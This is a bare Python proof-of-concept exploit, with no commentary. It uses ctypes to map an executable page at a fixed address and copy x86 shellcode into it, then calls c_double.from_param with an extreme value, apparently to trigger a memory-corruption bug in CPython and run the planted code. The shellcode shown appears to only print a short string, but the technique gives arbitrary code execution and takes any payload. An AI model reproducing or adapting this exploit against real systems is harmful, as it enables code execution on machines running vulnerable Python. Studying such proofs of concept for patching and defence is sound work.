from ctypes import (c_double, c_int, CDLL, memmove, create_string_buffer,
                    addressof, string_at)
from os import execve
# import pdb
 
libc = CDLL(None)
syscall = libc.syscall
NR_mmap = 192
target_address = 0x37333330
syscall(NR_mmap, target_address, 0x1000, 7, 0x21, -1, 0)
shellcode = create_string_buffer(
    b'h\x01\x01\x01\x01\x814$/\x0b\x01\x01\x01\x01haaaahaaaahaaaahaaaahaaaa\x89\xe1j\x01[j'
    b'\x13Zj\x04X\xcd\x80', 55)
memmove(target_address, addressof(shellcode), 55)

print(c_double.from_param(709676e300))
